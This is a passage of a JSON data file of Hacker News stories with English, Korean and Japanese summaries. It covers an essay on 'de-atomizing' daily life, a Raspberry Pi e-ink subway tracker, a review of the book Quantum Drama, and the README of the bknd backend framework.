exercise element was captured in stationary bikes, placed in a gym or a spin class, and most of the richness was removed. You still got the exercise, and some socialization from being in the gym or class, but there was no scenery, no exploration, no time in the outdoors. Then we got Peloton. No socialization. No scenery. No exploration. No sunlight. Exercise, sure, and Emma is cute, but that’s it. The richness of biking is gone.\nAnd, look, I love my Peloton, but it’s Type 1 exercise. Instead of exercise being a multifaceted activity that incorporates other essential life elements like seeing friends, getting fresh air, and looking away from a screen for a few moments, it reduces it to its simplest element and suggests that’s just as good. Maybe even better because you get a “harder workout.” The most important part of exercise, after all, is INTENSITY.\nWhere else do we see over-atomization? Food comes to mind. A meal should be about more than just food. Relaxation, spending time with your friends and family, fun, maybe joy. If you looked at an Italian neighborhood dinner and said “wow what a waste, don’t they know they could just drink a Huel and get back to work?” then, well, oof.\nBut atomization encourages us to reduce multivariate experiences, often the most important parts of life, to their single most obvious element:\nBiking is about exercise, and scheduling with friends and planning a route and inflating your tires all get in the way of that.\nEating is about sustenance, and inviting friends and getting groceries and cooking all get in the way of that.\nRelationships are about talking, and meeting up in person and leaving the house and scheduling are all inconveneiences.\nWork is about checking off tasks, so spending time commuting to an office where you might goof off and socialize all get in the way of that.\nThen when we feel lonely, painfully isolated by our atomized life, we schedule some atomized social time like going to a bar or coffee _to see friends _in between our lonely work and lonely dinner because we’ve removed most of the natural socializing elements from all of the other parts of life. Atomization turns an integrated day of socializing, eating, exercising, and working into discrete hurried chunks of trying to move from one thing to another, wondering why we never seem to have time for everything.\nAtomization is a global version of the problem I discussed in “work life balance is impossible,” the reason you can never have “work-life balance” is that you’ve placed Work and Life at odds, as ends of a scale that needs to be balanced out lest it tips too far in either direction.\nIf you throw Exercise and Socialization and Food and Fun and Hobbies into some complicated hexascale with Work and Life, you suddenly feel overwhelmed and start eyeing the benzos because seriously how can you possibly oh shit did the dogs get fed today ugh when did you last finish a book can you believe she hasn’t called you back is it 5 o’clock yet?\nBut at the root of this overwhelm is the language we use around many activities. “I’m going to go workout” feels more responsible than “I’m going to go for a walk with a friend.” We separate “I’m working” and “I’m playing.” We want to make everything extremely efficient, so we opt for going for a run alone instead of trying to link up with people along the way. We need to “be productive” so we don’t work from a coffee shop with friends.\nThere is probably some blame to be put on the dumb productivity world for this too. People think they need to focus and give things their full attention as if attention is the most important resource to optimize for. For your hour or two of deep work, sure, but after that, there’s no reason you can’t hang with friends while slowing chugging through shallow work. Obviously, you can multitask. You’ve never talked to someone while walking before?\nThe solution to the atomization curse that both gives us significantly more time back, and makes us much happier, is to seek to reintegrate these various foci of life as much as possible. How do you turn food back into a rich, multivariate experience with friends, fun, exploration, and relaxation? How do you blend socialization and exercise and community? How do you spend less time having shallower atomized relationships through a screen, and more time having rich in-person relationships where you get the full experience of other people?\nThe challenge is that these “Type 1,” or Atomized, versions of activities are the most immediately appealing. Booting up my computer to play a video game is way easier and sounds more immediately fun than texting some friends to play pickleball. Crushing takeout chips and queso sounds tastier and easier than cooking steak and rice. But I know I’ll feel better afterward with the latter, and that’s what we have to try to optimize for. Integrated living is more satisfying than atomic living.\nInstead of looking at some problem like “I don’t see enough friends,” or “I don’t work out enough,” or “I don’t have enough fun,” and then trying to find time to fit those priorities into, we should see how we can incorporate them into what we’re already doing. Could you make your workout less perfectly optimized so you can do it with friends? Can you loosen the reigns on your Super Duper Productive Routine to hang at a coffee shop with friends for a few hours a week? And for the love of God, can you please stop drinking fucking Huel or Soylent at your desk and talk to someone instead?\nThe more creatively we can integrate the various parts of life that matter to us, the more satisfied we’ll be in our day to day.\nThe more we atomize, the more lonely and overwhelmed we start to feel.\nDe-atomization is the secret to happiness.Enjoyed this? Subscribe below to receive the next piece in your inbox.",
    "summary": {
      "en": "The text discusses the concept of \"de-atomization\" as a key to happiness. It identifies two types of fun: \n\n1. **Type 1 Fun**: Immediate enjoyment from activities like watching movies or playing video games.\n2. **Type 2 Fun**: Enjoyment that comes from reflecting on experiences later, such as attending events or engaging in challenging activities.\n\nThe author argues that many aspects of life, including fitness, socializing, and eating, have become \"atomized,\" meaning they are often separated from the richer, multisensory experiences that make them fulfilling. For example, exercising is now often done in isolation rather than as a social activity, and meals are frequently reduced to mere sustenance instead of shared experiences.\n\nThis atomization leads to feelings of loneliness and overwhelm. The author suggests that instead of trying to fit fun, fitness, and socialization into separate time slots, we should find ways to integrate these activities into our daily lives. By combining them, we can enhance our overall satisfaction and well-being.\n\nIn essence, the text promotes the idea that reconnecting various life activities into a cohesive experience can lead to greater happiness, emphasizing that \"de-atomization\" is crucial for a fulfilling life.",
      "ko": "이 글에서는 행복의 열쇠로서 \"탈원자화\"라는 개념을 다룹니다. 여기서 두 가지 종류의 즐거움을 구분합니다. 첫 번째는 즉각적인 즐거움을 주는 '타입 1 즐거움'으로, 영화 감상이나 비디오 게임과 같은 활동에서 느끼는 즐거움입니다. 두 번째는 '타입 2 즐거움'으로, 나중에 경험을 되새기며 느끼는 즐거움입니다. 예를 들어, 행사에 참석하거나 도전적인 활동에 참여한 후의 만족감이 이에 해당합니다.\n\n저자는 삶의 여러 측면, 특히 운동, 사회적 활동, 식사가 \"원자화\"되어 있다고 주장합니다. 이는 이러한 활동들이 더 풍부하고 다감각적인 경험과 분리되어 있다는 의미입니다. 예를 들어, 운동은 이제 종종 혼자 하는 활동으로 변해버렸고, 식사는 단순한 영양 섭취로 축소되어 공유하는 경험이 줄어들고 있습니다.\n\n이러한 원자화는 외로움과 압박감을 초래합니다. 저자는 즐거움, 운동, 사회적 활동을 각각의 시간에 맞추려 하기보다는, 이러한 활동들을 일상생활에 통합할 방법을 찾아야 한다고 제안합니다. 이를 통해 우리는 전반적인 만족감과 웰빙을 향상시킬 수 있습니다.\n\n결국, 이 글은 다양한 삶의 활동을 하나의 일관된 경험으로 다시 연결하는 것이 더 큰 행복으로 이어질 수 있다는 점을 강조합니다. \"탈원자화\"가 충만한 삶을 위해 필수적이라는 메시지를 전달합니다.",
      "ja": "「デアトミゼーション」という概念が幸福の鍵として取り上げられています。この中で、楽しみには二つのタイプがあると説明されています。\n\n一つ目は「タイプ1の楽しみ」で、映画を観たり、ビデオゲームをしたりするような、即座に楽しめる活動から得られる喜びです。二つ目は「タイプ2の楽しみ」で、イベントに参加したり、挑戦的な活動に取り組んだりした後に振り返ることで得られる楽しみです。\n\n著者は、フィットネスや社交、食事などの多くの生活の側面が「アトミゼーション」、つまり、より豊かで多感覚的な体験から切り離されていると指摘しています。例えば、運動は今や孤立して行われることが多く、社交的な活動として行われることが少なくなっています。また、食事も単なる栄養補給に過ぎず、共有する体験としての意味が薄れているのです。\n\nこのアトミゼーションは孤独感や圧倒感を引き起こします。著者は、楽しみやフィットネス、社交を別々の時間に分けて行うのではなく、日常生活の中でこれらの活動を統合する方法を見つけるべきだと提案しています。これらを組み合わせることで、全体的な満足感や幸福感を高めることができるのです。\n\n要するに、さまざまな生活活動を一つのまとまりのある体験として再接続することが、より大きな幸福につながるという考えが示されています。「デアトミゼーション」が充実した生活には欠かせないことが強調されています。"
    }
  },
  {
    "id": "5bd444db4e2afeee",
    "title": {
      "en": "Train and Weather Tracker with Raspberry Pi and E-Ink",
      "ko": "파이로 기차 날씨 추적기",
      "ja": "ラズパイ天気列車トラッカー"
    },
    "type": "story",
    "url": "https://sambroner.com/posts/raspberry-pi-train",
    "score": 11,
    "by": "tosh",
    "time": 1743272545,
    "content": "Train & Weather Tracker with Raspberry Pi & E-InkMarch 2, 2025Art,Physical,SoftwareI finally built a Raspberry Pi project my wife loves: an e-ink train and weather tracker! If you want to build one yourself, the Github & instructions are here.\nKira will be jogging to the night shift!\nOver the past few years, I've been on something of an e-ink journey.  I started with a weather and news display (still the only post on my website that regularly gets organic traffic.) While I loved it and it looked great, a phone is a better way to check the news, and the weather only gets checked once a day. Then in 2022 while at MIT I built Jarvis, the e-ink voice-to-image display. Jarvis was a great party trick — say, \"Hey Jarvis, paint me an elephant on a bowling ball in Times Square\" and watch as the image gradually appeared. Notably, this was before ChatGPT, when people were still impressed by AI!\nJarvis live demo is better!\nThen over Thanksgiving, I had some free time, a basket of spare parts, and the itch to code and build something physical. So here we are with the e-ink train and weather tracker.\nThe idea is simple: Every morning, my wife and I take the inbound F or G subway lines to work from a stop that's a 2-minute jog or a 6-minute walk from our house. I love the NYC subway and it works incredibly well, but the trains come often and predictably, not on-a-schedule. So every morning we're calling out, when's the next G, when's the next F — and one of us pulls out a phone for the MTA app or Google Maps and yells back the upcoming train times. Then we time our morning routines to either stretch for a train in three minutes or slow down for a train in ten.\nThe subway and weather tracker makes checking train times much faster and calmer than pulling out a phone. Since it's centrally located in our home, someone is always close enough to glance at it.\nThe subway times reported by the MTA API are reliable once the train is within a few stops or 15 minutes away, with precision increasing as the trains get closer. Having the train times on the wall lets you check how your morning routine is developing against the train schedule as the departure time gets closer.\nBest of all, Kira loves it! This goes on my DIY pantheon along with adding legs to her dresser to make it a better height and fixing a towel rack right before she hosted her colleagues for a book club.\nIf you want to build one yourself or better understand the project, I'll dive into some editorial and gotchas below. The practical instructions, parts, and code live in this GitHub Repo.\nDescription & Features\nThe train & weather tracker is built on a 9.7\" 1200x825 E-Ink display attached to a Raspberry Pi 4b. The display is split into four parts: a header, with date, time, and a live second hand to indicate liveness; a train tracker; the commute weather; and a \"weather bar\" displaying the next 12 hours of weather. The main focus of the layout is the train tracker, which shows the upcoming 30 minutes of inbound F & G trains.\n\nThe display sits in a laser cut mat board with black ridges sized to hide the black border of the e-ink display. The mat board sits in a 8.5\" x 11\" cherry frame that is 1.5\" deep to allow the raspberry pi to be backmounted while the frame is still flush to the wall. We hang the display next to the door above a key holder, which is generally the right place for it, but also helps hide the power cord.\nNot pretty, but it works\nProject Details\nThe software portion of the project is manageable although there are some gotchas when programming against the Waveshare e-ink hat in particular. We have a modular architecture with a clear separation of concerns:\n\nDisplay Engine: Renders the layout to the display, supporting communication with the physical e-ink display or rendering a png for non-raspberry pi development\n\nLayout System: A pretty hacky visual arrangement of the elements. It'd be fun to do something more sophisticated here (e.g. a html renderer), but 🤷‍♂️. This will likely require the most work if you want to modify the project\n\nData Services: Fetch & process (this is important!) train arrival from NYC Transit GTFS feeds + get the weather forecasts\n\nApplication Controller: Orchestrate the event loop and subscription model to drive updates to the display\n\nThe biggest technical constraint is the update rate to the e-ink display. The display supports multiple update modes with different tradeoffs and can manage sub 500 ms updates, especially for partial updates, but a faster refresh results in fuzzy characters and substantial ghosting that looks pretty bad. The bigger issue is that overloading the display causes it to crash, which requires a full reset.\nAfter some testing, I chose a hybrid display update strategy.\nEvery second, the pixels around the seconds & minutes digits of the time are rerendered with the display's fastest partial update mode to make it clear that the display is functioning as expected.\nWhen there is an update to one of the next two train times (these matter more than trains 30 minutes away), there is a fast-full display render — all data is updated at this point, but only new arrival times for one of the next two trains will drive the update.\nOn the hour, the display does a deep full-screen render to sharpen the characters and remove ghosting.\nHonestly, you gotta experiment to understand how these will look\nDoing deep full screen renders can be jarring — it results in a black and white flash that attracts too much attention to the screen — but once an hour is a fine cadence. For the train times, a fast-full display render works better than a partial refresh because of the layout. The fast partial render cuts across elements, drawing more attention to the refresh than a full refresh. This could maybe be improved through more purposeful partial refresh rectangle selection, but the current solution works well.\nThe framing was tricky because I wanted something nice, but without breaking the bank. I'm not great at woodworking and I also didn't want to spend $300-$500, which was the range of quotes (FWIW, I have been trying to find a low cost framing solution for these broken glass pieces for years — let me know if you have any ideas). The e-ink display is awkwardly sized due to the connection cables and drivers. The display surface also has a fine looking, but inelegant border that should be covered. After talking to a few framers, one of them suggested I buy just a custom mat. The mat hides the display, Raspberry Pi, and cabling, but more importantly the outside of the mat is right sized to fit into a standard-sized frame.\nThe finished product sits neatly beside our door, providing the exact information we need at just the right time each morning. I've written before about the \"agency gap\" — the gap between what people do and what would be easy, but useful to do. This project is a bit more involved than that, but at ~20 hours of work, it was worth it to me. I built something that solves a daily need, we actually use it, guests talk about it, and it looks great.HomeNext →587 Miles, 803 Meetings, and 14 Dates: My completely sane system for personal analytics\n    Comments hosted by TwitterClick for discussion",
    "summary": {
      "en": "A Raspberry Pi project has been created to build an e-ink train and weather tracker that the author's wife loves. This device displays real-time train schedules for the F and G subway lines, along with the weather, making it easier for the couple to manage their morning routines without constantly checking their phones.\n\nThe tracker features a 9.7-inch e-ink display divided into sections showing the date, time, train arrival times, and upcoming weather. It's designed to be visually appealing and is mounted near the door for easy access. The software integrates data from the NYC Transit API and weather forecasts, with a focus on keeping the train information updated efficiently.\n\nThe project took about 20 hours to complete and aims to fill a daily need, enhancing the couple's morning experience. Instructions and materials for building one are available on GitHub.",
      "ko": "라즈베리 파이 프로젝트를 통해 저자의 아내가 좋아하는 전자 잉크 기차 및 날씨 추적기가 만들어졌습니다. 이 장치는 F선과 G선 지하철의 실시간 운행 정보를 보여주며, 날씨 정보도 함께 제공하여 부부가 아침 일과를 관리하는 데 도움을 줍니다. 스마트폰을 자주 확인할 필요가 없어졌습니다.\n\n추적기는 9.7인치 전자 잉크 디스플레이로 구성되어 있으며, 날짜, 시간, 기차 도착 시간, 다가오는 날씨를 보여주는 섹션으로 나뉘어 있습니다. 시각적으로 매력적으로 디자인되었고, 문 근처에 설치되어 쉽게 접근할 수 있습니다. 소프트웨어는 뉴욕시 대중교통 API와 날씨 예보 데이터를 통합하여 기차 정보를 효율적으로 업데이트하는 데 중점을 두고 있습니다.\n\n이 프로젝트는 약 20시간이 소요되었으며, 부부의 아침 경험을 향상시키기 위해 일상적인 필요를 충족시키는 것을 목표로 하고 있습니다. 제작 방법과 필요한 재료는 GitHub에서 확인할 수 있습니다.",
      "ja": "ラズベリーパイを使ったプロジェクトが作成され、著者の妻が気に入る電子インクの列車と天気のトラッカーが完成しました。このデバイスは、F線とG線の地下鉄のリアルタイムの運行スケジュールと天気を表示し、夫婦が朝のルーチンを管理しやすくしています。スマートフォンを頻繁にチェックする必要がなくなります。\n\nトラッカーは9.7インチの電子インクディスプレイを備えており、日付、時間、列車の到着時刻、今後の天気を示すセクションに分かれています。見た目にもこだわっており、ドアの近くに取り付けられていて、簡単にアクセスできます。ソフトウェアはニューヨーク市交通局のAPIと天気予報のデータを統合しており、列車情報を効率的に更新することに重点を置いています。\n\nこのプロジェクトは約20時間で完成し、日常のニーズを満たすことを目的としています。夫婦の朝の体験を向上させるためのものです。作成方法や必要な材料はGitHubで入手可能です。"
    }
  },
  {
    "id": "879e3d538b252cb6",
    "title": {
      "en": "Rubik's Cube Solutions, Puzzles, and 8-Balls (2023)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://williambader.com/museum/cubes/cubes.html",
    "score": 25,
    "by": "wonger_",
    "time": 1743082818,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "1aa80557db21821e",
    "title": {
      "en": "Beyond Bohr and Einstein",
      "ko": "보어와 아인슈타인 너머",
      "ja": "ボーアとアインシュタインを超えて"
    },
    "type": "story",
    "url": "https://cerncourier.com/beyond-bohr-and-einstein/",
    "score": 46,
    "by": "mathgenius",
    "time": 1743035841,
    "content": "Quantum Drama, by Jim Baggott and John L Heilbron, Oxford University Press\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tOne hundred years of insights Jim Baggott and John Heilbron don’t neglect later quantum pioneers like John Bell (pictured). Credit: CERN\n\n\t\t\t\t\t\t\t\tWhen I was an undergraduate physics student in the mid-1980s, I fell in love with the philosophy of quantum mechanics. I devoured biographies of the greats of early-20th-century atomic physics – physicists like Bohr, Heisenberg, Schrödinger, Pauli, Dirac, Fermi and Born. To me, as I was struggling with the formalism of quantum mechanics, there seemed to be something so exciting, magical even, about that era, particularly those wonder years of the mid-1920s when its mathematical framework was being developed and the secrets of the quantum world were revealing themselves.\nI went on to do a PhD in nuclear reaction theory, which meant I spent most of my time working through mathema­tical derivations, becoming familiar with S-matrices, Green’s functions and scattering amplitudes, scribbling pages of angular-momentum algebra and coding in Fortran 77. And I loved that stuff. There certainly seemed to be little time for worrying about what was really going on inside atomic nuclei. Indeed, I was learning that even the notion of something “really going on” was a vague one. My generation of theoretical physicists were still being very firmly told to “shut up and calculate”, as many adherents of the Copenhagen school of quantum mechanics were keen to advocate. To be fair, so much progress has been made over the past century, in nuclear and particle physics, quantum optics, condensed-matter physics and quantum chemistry, that philosophical issues were seen as an unnecessary distraction. I recall one senior colleague, frustrated by my abiding interest in interpretational matters, admonishing me with: “Jim, an electron is an electron is an electron. Stop trying to say more about it.” And there certainly seemed to be very little in the textbooks I was reading about unresolved issues arising from such topics as the EPR (Einstein–Podolsky–Rosen) paradox and the measurement problem, let alone any analysis of the work of Hugh Everett and David Bohm, who were regarded as mavericks. The Copenhagen hegemony ruled supreme.\nWhat I wasn’t aware of until later in my career was that a community of physicists had indeed continued to worry and think about such matters. These physicists were doing more than just debating and philosophising – they were slowly advancing our understanding of the quantum world. Experimentalists such as Alain Aspect, John Clauser and Anton Zeilinger were devising ingenious experiments in quantum optics – all three of whom were only awarded the Nobel Prize for their work on tests of John Bell’s famous inequality in 2022, which says a lot about how we are only now acknowledging their contribution. Meanwhile, theorists such as Wojciech Zurek, Erich Joos, Deiter Zeh, Abner Shimony and Asher Peres, to name just a few, were formalising ideas on entanglement and decoherence theory. It is certainly high time that quantum-mechanics textbooks – even advanced undergraduate ones – should contain their new insights.\nCredit: Oxford University Press\nAll of which brings me to Quantum Drama, a new popular-science book and collaboration between the physicist and science writer Jim Baggott and the late historian of science John L Heilbron. In terms of level, the book is at the higher end of the popular-science market and, as such, will probably be of most interest to, for example, readers of CERN Courier. If I have a criticism of the book it is that its level is not consistent. For it tries to be all things. On occasion, it has wonderful biographical detail, often of less well-known but highly deserving characters. It is also full of wit and new insights. But then sometimes it can get mired in technical detail, such as in the lengthy descriptions of the different Bell tests, which I imagine only professional physicists are likely to fully appreciate.\n\n    googletag.cmd.push(function() { googletag.display('div-gpt-ad-5400963-1'); });\n\nHaving said that, the book is certainly timely. This year the world celebrates the centenary of quantum physics, since the publication of the momentous papers of Heisenberg and Schrödinger on matrix and wave mechanics, in 1925 and 1926, respectively. Progress in quantum information theory and in the development of new quantum technologies is also gathering pace right now, with the promise of quantum computers, quantum sensing and quantum encryption getting ever closer. This all provides an opportunity for the philosophy of quantum mechanics to finally emerge from the shadows into mainstream debate again.\nA new narrative\nSo, what makes Quantum Drama stand out from other books that retell the story of quantum mechanics? Well, I would say that most historical accounts tend to focus only on that golden age between 1900 and 1927, which came to an end at the Solvay Conference in Brussels and those well-documented few days when Einstein and Bohr had their debate about what it all means. While these two giants of 20th-century physics make the front cover of the book, Quantum Drama takes the story on beyond that famous conference. Other accounts, both popular and scholarly, tend to push the narrative that Bohr won the argument, leaving generations of physicists with the idea that the interpretational issues had been resolved – apart that is, from the odd dissenting voices from the likes of Everett or Bohm who tried, unsuccessfully it was argued, to put a spanner in the Copenhagen works. All the real progress in quantum foundations after 1927, or so we were told, was in the development of quantum field theories, such as QED and QCD, the excitement of high-energy physics and the birth of the Standard Model, with the likes of Murray Gell-Mann and Steven Weinberg replacing Heisenberg and Schrödinger at centre stage. Quantum Drama takes up the story after 1927, showing that there has been a lively, exciting and ongoing dispute over what it all means, long after the death of those two giants of physics. In fact, the period up to Solvay 1927 is all dealt with in Act I of the book. The subtitle puts it well: From the Bohr–Einstein Debate to the Riddle of Entanglement.\nThe Bohr–Einstein debate is still very much alive and kicking\n\nAll in all, Quantum Drama delivers something remarkable, for it shines a light on all the muddle, complexity and confusion surrounding a century of debate about the meaning of quantum mechanics and the famous “Copenhagen spirit”, treating the subject with thoroughness and genuine scholarship, and showing that the Bohr–Einstein debate is still very much alive and kicking.",
    "summary": {
      "en": "**Summary of *Quantum Drama* by Jim Baggott and John L Heilbron**\n\n*Quantum Drama* is a book that explores the history and philosophy of quantum mechanics, focusing on the ongoing debates and developments that have occurred since the early 20th century. Authors Jim Baggott and John Heilbron highlight the significant contributions of physicists beyond just the famous figures like Bohr and Einstein, noting that many others have continued to investigate the philosophical implications and complexities of quantum theory.\n\nThe book is timely, coinciding with the centenary of quantum physics, and emphasizes how advancements in quantum information technology are reigniting interest in the philosophical aspects of the subject. Unlike many historical accounts that conclude the debate after the 1927 Solvay Conference, *Quantum Drama* extends the narrative to show that discussions about the meaning of quantum mechanics are still very much ongoing.\n\nThe authors aim to present a thorough and engaging look at a century of scientific debate, emphasizing that the disagreements between Bohr and Einstein persist today. While the book offers rich biographical details and insights, it occasionally delves into technical content that might be challenging for general readers. Overall, it presents a comprehensive view of the evolution of quantum theory and its philosophical ramifications.",
      "ko": "*Quantum Drama*는 양자역학의 역사와 철학을 탐구하는 책으로, 20세기 초부터 현재까지 이어져 온 논쟁과 발전을 다룹니다. 저자 짐 배곳과 존 하일브론은 보어와 아인슈타인과 같은 유명한 물리학자들 외에도 많은 다른 연구자들이 양자 이론의 철학적 의미와 복잡성을 계속해서 조사해왔음을 강조합니다.\n\n이 책은 양자 물리학의 100주년과 맞물려 출간되어, 양자 정보 기술의 발전이 이 주제의 철학적 측면에 대한 관심을 다시 불러일으키고 있음을 강조합니다. 많은 역사적 서술이 1927년 솔베이 회의 이후 논쟁이 끝났다고 결론짓는 것과 달리, *Quantum Drama*는 양자역학의 의미에 대한 논의가 여전히 진행 중임을 보여줍니다.\n\n저자들은 100년 간의 과학적 논쟁을 철저하고 흥미롭게 살펴보려 하며, 보어와 아인슈타인 간의 의견 차이가 오늘날에도 여전히 존재한다는 점을 강조합니다. 이 책은 풍부한 전기적 세부사항과 통찰을 제공하지만, 일반 독자에게는 다소 어려울 수 있는 기술적인 내용도 포함되어 있습니다. 전반적으로 양자 이론의 발전과 그 철학적 결과에 대한 포괄적인 시각을 제시합니다.",
      "ja": "*Quantum Drama*は、量子力学の歴史と哲学を探求する書籍で、20世紀初頭から続く議論や発展に焦点を当てています。著者のジム・バゴットとジョン・ハイルブロンは、ボーアやアインシュタインといった著名な物理学者だけでなく、多くの他の研究者が量子理論の哲学的な意味や複雑さを探求し続けていることを強調しています。\n\nこの本は、量子物理学の100周年に合わせて出版され、量子情報技術の進展がこの分野の哲学的側面への関心を再燃させていることを強調しています。多くの歴史的な記述が1927年のソルベイ会議で議論が終わったとするのに対し、*Quantum Drama*はその後も量子力学の意味についての議論が続いていることを示しています。\n\n著者たちは、科学的な議論の100年を包括的かつ魅力的に紹介することを目指しており、ボーアとアインシュタインの対立が今も続いていることを強調しています。本書は豊富な伝記情報や洞察を提供しつつ、一般読者には難しい技術的な内容にも触れることがあります。全体として、量子理論の進化とその哲学的影響についての包括的な視点を提供しています。"
    }
  },
  {
    "id": "099893d623ca6d0b",
    "title": {
      "en": "Show HN: Bknd – Firebase alternative that embeds into any React stack",
      "ko": "쇼 HN: Bknd – 리액트에 최적화된 파이어베이스 대안",
      "ja": "Firebaseの代替「Bknd」"
    },
    "type": "story",
    "url": "https://github.com/bknd-io/bknd",
    "score": 45,
    "by": "dswbx",
    "time": 1742913257,
    "content": "⭐ Live Demo\n\nbknd simplifies app development by providing a fully functional backend for database management, authentication, media and workflows. Being lightweight and built on Web Standards, it can be deployed nearly anywhere, including running inside your framework of choice. No more deploying multiple separate services!\nFor documentation and examples, please visit https://docs.bknd.io.\nWarningPlease keep in mind that bknd is still under active development\nand therefore full backward compatibility is not guaranteed before reaching v1.0.0.\n\nSize\n\nThe size on npm is misleading, as the bknd package includes the backend, the ui components as well as the whole backend bundled into the cli including static assets.\nDepending on what you use, the size can be higher as additional dependencies are getting pulled in. The minimal size of a full bknd app as an API is around 212 kB gzipped (e.g. deployed as Cloudflare Worker).\nMotivation\nCreating digital products always requires developing both the backend (the logic) and the frontend (the appearance). Building a backend from scratch demands deep knowledge in areas such as authentication and database management. Using a backend framework can speed up initial development, but it still requires ongoing effort to work within its constraints (e.g., \"how to do X with Y?\"), which can quickly slow you down. Choosing a backend system is a tough decision, as you might not be aware of its limitations until you encounter them.\nThe solution: A backend system that only assumes and implements primitive details, integrates into multiple environments, and adheres to industry standards.\nFeatures\n\n⚡ Instant backend with full REST API:\n\nData: Define, query, and control your data with ease.\nAuth: Easily implement reliable authentication strategies.\nMedia: Effortlessly manage and serve all your media files.\nFlows: Design and run workflows with seamless automation. (UI integration coming soon!)\n\n🌐 Built on Web Standards for maximum compatibility\n🏃‍♂️ Multiple run modes\n\nstandalone using the CLI\nusing a JavaScript runtime (Node, Bun, workerd)\nusing a React framework (Next.js, React Router, Astro)\n\n📦 Official API and React SDK with type-safety\n⚛️ React elements for auto-configured authentication and media components\n\nStructure\nThe package is mainly split into 4 parts, each serving a specific purpose:\n\nImport\nPurpose\n\nbkndbknd/adapter/*\nBackend including APIs and adapters\n\nbknd/ui\nAdmin UI components for react frameworks\n\nbknd/client\nTypeScript SDK and React hooks for the API endpoints\n\nbknd/elements\nReact components for authentication and media\n\nThe backend (bknd)\nServe the backend as an API for any JS runtime or framework. The latter is especially handy, as it allows you to deploy your frontend and backend bundled together. Furthermore it allows adding additional logic in a way you're already familar with. Just add another route and you're good to go.\nHere is an example of serving the API using node:\nimport { serve } from \"bknd/adapter/node\"\nserve();\n\nIntegrated admin UI (bknd/ui)\nThe admin UI allows to manage your data including full configuration of your backend using a graphical user interface. Using vite, your admin route looks like this:\nimport { Admin } from \"bknd/ui\"\nimport \"bknd/dist/styles.css\";\n\nexport default function AdminPage() {\n   return <Admin />\n}\n\nUsing the REST API or TypeScript SDK (bknd/client)\nIf you're not using a JavaScript environment, you can still access any endpoint using the REST API:\ncurl -XGET <your-endpoint>/api/data/entity/<entity>\n{\n  \"data\": [\n    { \"id\": 1, ... },\n    { \"id\": 2, ... }\n  ],\n  \"meta\": { /* ... */ }\n}\n\nIn a JavaScript environment, you can use the TypeScript SDK with type-safety. The above example would look like this:\nimport { Api } from \"bknd/client\";\n\nconst api = new Api({ host: \"<endpoint>\" });\nconst { data } = await api.data.readMany(\"<entity>\");\n\nIf you're using React, there are 2 hooks exposed (useApi, useEntity), as well as an swr wrapper around each (useApiQuery, useEntityQuery). The swr wrapped hooks automatically handled query invalidation:\nimport { useState } from \"react\";\nimport { useEntityQuery } from \"bknd/client\";\n\nexport default function App() {\n   const { data } = useEntityQuery(\"todos\");\n   return <ul>\n      {data?.map(todo => (\n         <li key={todo.id}>{todo.name}</li>\n      ))}\n   </ul>\n}\n\nReact elements (bknd/elements)\nYou don't have to figure out API details to include media uploads to your app. For an user avatar upload, this is all you need:\nimport { Media } from \"bknd/elements\"\nimport \"bknd/dist/main.css\"\n\nexport function UserAvatar() {\n   return <Media.Dropzone\n     entity={{ name: \"users\", id: 1, field: \"avatar\" }}\n     maxItems={1}\n     overwrite\n   />\n}\n\nThe import path also exports components for login and registration forms which are automatically pointed to the bknd defaults.\n🚀 Quick start\nTo quickly spin up an instance, run:\nnpx bknd run\n\nInstallation\nnpm install bknd",
    "summary": {
      "en": "**Summary of bknd**\n\nbknd is a tool that simplifies app development by providing an easy-to-use backend for managing databases, user authentication, media, and automated workflows. It's lightweight and can be deployed in various environments, eliminating the need for multiple separate services. However, it’s still in development, so some features may change before the final version.\n\n**Key Features:**\n- **Instant Backend:** Offers a full REST API for managing data and authentication seamlessly.\n- **Web Standards:** Built for compatibility across different platforms.\n- **Multiple Deployment Options:** Can run standalone, in a JavaScript runtime, or within React frameworks.\n- **Type-Safe SDK:** Includes a TypeScript SDK and React components for easy integration.\n\n**Structure:**\n1. **Backend (bknd):** Serves APIs for any JavaScript environment.\n2. **Admin UI (bknd/ui):** A graphical interface for managing your backend data.\n3. **API Access (bknd/client):** Use REST API or TypeScript SDK for data interactions.\n4. **React Components (bknd/elements):** Pre-built components for user authentication and media uploads.\n\n**Quick Start:** To set it up, simply run `npx bknd run` after installation with `npm install bknd`.\n\nFor more details and examples, visit the [bknd documentation](https://docs.bknd.io).",
      "ko": "bknd는 데이터베이스 관리, 사용자 인증, 미디어 처리 및 자동화된 워크플로우를 위한 사용하기 쉬운 백엔드를 제공하여 앱 개발을 간소화하는 도구입니다. 이 도구는 가볍고 다양한 환경에 배포할 수 있어 여러 개의 별도 서비스를 사용할 필요가 없습니다. 그러나 현재 개발 중이므로 최종 버전에서는 일부 기능이 변경될 수 있습니다.\n\nbknd의 주요 기능으로는 완전한 REST API를 제공하여 데이터와 인증을 원활하게 관리할 수 있는 즉시 사용 가능한 백엔드가 있습니다. 다양한 플랫폼과의 호환성을 위해 웹 표준에 맞춰 설계되었습니다. 또한 독립적으로 실행되거나 JavaScript 런타임, React 프레임워크 내에서 실행할 수 있는 여러 배포 옵션을 제공합니다. TypeScript SDK와 React 컴포넌트를 포함하여 쉽게 통합할 수 있는 타입 안전한 SDK도 제공합니다.\n\nbknd의 구조는 다음과 같습니다. 첫째, bknd는 모든 JavaScript 환경을 위한 API를 제공합니다. 둘째, bknd/ui는 백엔드 데이터를 관리하기 위한 그래픽 인터페이스입니다. 셋째, bknd/client를 통해 REST API 또는 TypeScript SDK를 사용하여 데이터와 상호작용할 수 있습니다. 마지막으로, bknd/elements는 사용자 인증 및 미디어 업로드를 위한 미리 구축된 컴포넌트입니다.\n\n설치를 마친 후 `npm install bknd`로 설치한 다음, `npx bknd run` 명령어를 실행하면 쉽게 설정할 수 있습니다. 더 많은 정보와 예제는 bknd 문서를 방문하세요.",
